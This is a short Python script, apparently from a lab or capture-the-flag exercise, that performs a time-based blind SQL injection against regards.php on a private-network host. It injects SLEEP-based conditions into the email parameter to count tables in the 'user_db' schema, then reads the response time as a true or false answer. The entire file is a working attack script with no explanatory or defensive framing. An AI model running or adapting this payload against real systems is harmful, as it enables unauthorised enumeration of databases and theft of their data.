import os
import requests
import time

# GET THE NUMBER OF TABLES



dbname = "user_db"
chars = "abcdefghijklmnopqrstuvwxyz0123456789"


target = "http://10.102.87.195/regards.php?email='AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='"
target = target.replace("SLEEP(5)", "IF(LENGTH(DATABASE())='7', SLEEP(1), SLEEP(0.5))")


query = "(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = 'user_db' LIMIT 1) = '2'"


target = target.replace("LENGTH(DATABASE())='7'", query)



r = requests.get(target)
print(r.elapsed.total_seconds(), target)



taken = r.elapsed.total_seconds()
if taken > 0.2:
    if taken > 1.0:
        print("True")
    else:
        print("False")
else:
    print("ERROR")

